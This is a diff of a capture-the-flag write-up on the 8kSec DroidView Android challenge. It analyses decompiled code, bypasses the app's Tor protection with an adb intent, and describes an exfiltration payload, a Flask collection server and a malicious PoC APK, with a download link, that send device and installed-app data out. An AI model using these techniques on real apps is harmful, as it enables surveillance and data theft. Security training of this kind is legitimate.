@@ -10,10 +10,13 @@ adb install -r DroidView.apk
 ```
 
 We can see that we can *load any arbitrary* URL *manually*. With a *toggle* that **enable "Tor Security"**.
+
 Let's inspect the **source code** using **JADX**.
 ### Exploring the Application
 Looking in the `AndroidManifest.xml` file, we can see that the *package name* is `com.eightksec.droidview`.
+
 And we have just *one activity*: `com.eightksec.droidview.MainActivity`.
+
 This activity **can handle some intents**:
 ```XML
 <activity
@@ -46,7 +49,9 @@ This activity **can handle some intents**:
 </activity>
 ```
 The most important:
+
 - `com.eightksec.droidview.LOAD_URL`
+
 - `com.eightksec.droidview.TOGGLE_SECURITY`
 
 Also, here we have this **service**:
@@ -64,7 +69,9 @@ Also, here we have this **service**:
 ```
 
 Let's see the **java code**!
+
 Starting with **`MainActivity`** class, we have a *lot of functions* that we need analyze.
+
 First, we can see some variables:
 ```java
 public static final String ACTION_LOAD_URL = "com.eightksec.droidview.LOAD_URL";
@@ -75,6 +82,7 @@ public static final String EXTRA_URL = "url";
 ```
 
 In order to *prioritize the methods and functions*, I will mention just relevant.
+
 `onCreate(...)`function:
 ```java
 protected void onCreate(Bundle bundle) {
@@ -141,10 +149,15 @@ protected void onCreate(Bundle bundle) {
 ```
 
 This method:
+
 - Initialize `SecurityTokenManager` and **start** `TokenService`.
+
 - Configure **WebView** (`setupWebView()`).
+
 - Register `BroadcastReceiver` `securityToggleReceiver` for **`ACTION_TOGGLE_SECURITY`**.
+
 - *Read the persisted* `security_enabled` state and, *if applicable*, call `startTor()`.
+
 - Process the **incoming intent** with `handleIntent(getIntent())`.
 
 Next, we have the `onNewIntent(Intent intent)` function:
@@ -160,6 +173,7 @@ protected void onNewIntent(Intent intent) {
 }
 ```
 If **action** = **`ACTION_TOGGLE_SECURITY`** → `handleSecurityToggle(intent)`.
+
 Else → `handleIntent(intent)`.
 
 Function `handleIntent()` code:
@@ -213,8 +227,11 @@ private void handleIntent(Intent intent) {
 }
 ```
 This method:
+
 - Accepts **ACTION_VIEW (HTTP/HTTPS)** and **ACTION_LOAD_URL (extra "URL")**.
+
 - Set `isExternalRequest` = **true**.
+
 - If `securityEnabled` and `!torReady` → delay with **`pendingUrl`** + **`startTor()`**; **otherwise**, **`loadUrl()`**.
 
 And the **vulnerable code** is `handleSecurityToggle()`:
@@ -251,7 +268,9 @@ private void handleSecurityToggle(Intent intent) {
 }
 ```
 This function:
+
 - **Read** `enable_security` and call **`setSecurityEnabled(boolean)`** **WITHOUT validating the token**.
+
 - *If security is disabled* and the *current page ≠ about:blank*, clear the proxy/cache and **reload the URL**.
 
 Also we can notice the `setupWebView()` with this properties:
@@ -270,6 +289,7 @@ settings.setBlockNetworkLoads(false);
 ```
 
 And finally, `startTor()` / `stopTor()`
+
 But, *most important*, **`stopTor()`**
 ```java
 private void stopTor() {
@@ -352,18 +372,25 @@ class C04831 extends BroadcastReceiver {
 }
 ```
 This receiver:
+
 - **Only validate the token when receiving a broadcast**: if `enable=false` and `!validateSecurityToken(token)` → “**Invalid security token**”.
+
 - If **OK** → `securitySwitch.setChecked(z)` + `setSecurityEnabled(z)`.
 
 Let's move to **`SecurityTokenManager`** class.
+
 We can see an **hardcoded token**
 ```java
 private static final String HARDCODED_TOKEN = "8dhf7yh3n47yt348ty9384ty9384t3y84t";
 ```
 But we don't need that.
+
 Also, `initializeSecurityToken()` that if **it doesn't exist**: generate random 32B → AES-CBC with random IV and key derived from `HARDCODED_TOKEN`.
+
 Then, save Base64 to SQLite.
+
 Another functions, `validateToken(String t)` and `getCurrentToken()`.
+
 Nothing useful for our attack.
 
 Exploring **`TokenService`**, we can notice an `onBind()` that *return* `ITokenServiceStub`.
@@ -431,9 +458,13 @@ public class TokenService extends Service {
 }
 ```
 - **`ITokenServiceStub`**:
+
     - `getSecurityToken()` → `SecurityTokenManager.getCurrentToken()`
+  
     - `disableSecurity()` → `true` (stub)
+  
     - `onTransact` exposes transactions 1 (`getSecurityToken`) and 2 (`disableSecurity`)
+
 - **Manifest:** `<service android:exported="true">` with actions `ITokenService`/`TOKEN_SERVICE`. **WITHOUT PERMISSIONS**.
 
 Now, in the *interface* **``ITokenService``** (AIDL) we can notice:
@@ -444,6 +475,7 @@ public boolean disableSecurity() throws RemoteException {
 ```
 
 Finally, **`TokenClient`** that have a *callback* `getSecurityToken(Callback)`:
+
 - `bindService()` to `com.eightksec.droidview.ITokenService`; above `onServiceConnected` invoke `getSecurityToken()`.
 ```java
 public void getSecurityToken(TokenCallback tokenCallback) {
@@ -460,7 +492,9 @@ public void getSecurityToken(TokenCallback tokenCallback) {
 ```
 ### Bypassing Tor Security
 First we need **disable/bypass** the **Tor Security** protection.
+
 In the Main Activity, we saw that there are some intents, and passing as extras the **status** of the Tor security.
+
 Active the *toggle* for *Tor Security* and then let's check that using **ADB**
 ```bash
 adb shell am start -n com.eightksec.droidview/.MainActivity \
@@ -468,12 +502,15 @@ adb shell am start -n com.eightksec.droidview/.MainActivity \
   --activity-single-top
 ```
 We send the extra (`ez` for boolean values) `enable_security` as *false*.
+
 The `--activity-single-top` is used for test due that we already was launched the application.
 
 And we can notice that **successfully we can bypass the mechanism**.
+
 This can be *exploited* crafting a *malicious application* that send an intent to target app with the *same configuration*.
 ### Crafting the payload
 According to challenge specifications, we must create an `payload.html` file that **theft device information**.
+
 This is the *HTML code that will fulfill one of the requirements 8kSec asks* of us for the challenge: *exfiltrating the IP address, User Agent, and other elements*.
 ```HTML
 <!doctype html>
@@ -570,11 +607,13 @@ if __name__ == "__main__":
 ```
 ### PoC - APK
 Finally, the code that will trigger all of above.
+
 Since we need **get the package name** for all *apps installed*, and then, **send to our flask server**, we need add into our `AndroidManifest.xml` file the *internet permission*.
 ```XML
 <uses-permission android:name="android.permission.INTERNET" />
 ```
 And, very important, the `android:usesCleartextTraffic="true"` in the `<application` attributes.
+
 Full `AndroidManifest.xml` file:
 ```XML
 <?xml version="1.0" encoding="utf-8"?>  
@@ -683,7 +722,9 @@ public class MainActivity extends AppCompatActivity {
 ```
 
 **Download PoC**: https://lautarovculic.com/my_files/DroidViewExploit.apk
+
 Notice that we *first send the application* list to our server **before** that send the *intent* to DroidView.
+
 This is because **if we send the intent to DroidView first**, our app will be *in background*, and DroidView in *foreground*, and the *theft of packages names* will never happen in this order.
 
 Put the *server* to run and then, *launch the application*. Remember change the IP server by your own.
